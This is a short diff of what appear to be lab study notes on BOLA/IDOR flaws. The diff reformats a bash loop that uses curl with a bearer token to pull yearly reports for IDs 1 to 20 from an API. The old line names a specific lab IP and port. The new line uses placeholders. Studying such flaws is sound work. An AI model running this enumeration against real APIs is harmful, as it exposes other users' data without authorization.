@@ -12,5 +12,10 @@ BOLA also known as an Insecure Direct Object Reference (IDOR) vulnerability.
 
 Mass abuse BOLA from terminal:
 ```
-for ((i=1; i<=20; i++)); do curl -X 'GET'   'http://94.237.59.225:40957/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbG<SNIP>' | jq; done
+for ((i=1; i<=20; i++));
+do curl -s -w "\n" -X 'GET' \
+'http://$ip:$port/endpoint/'$i'' \
+-H 'accept: application/json' \
+-H 'Authorization: Bearer eyJhbG<SNIP>' | jq;
+done
 ```
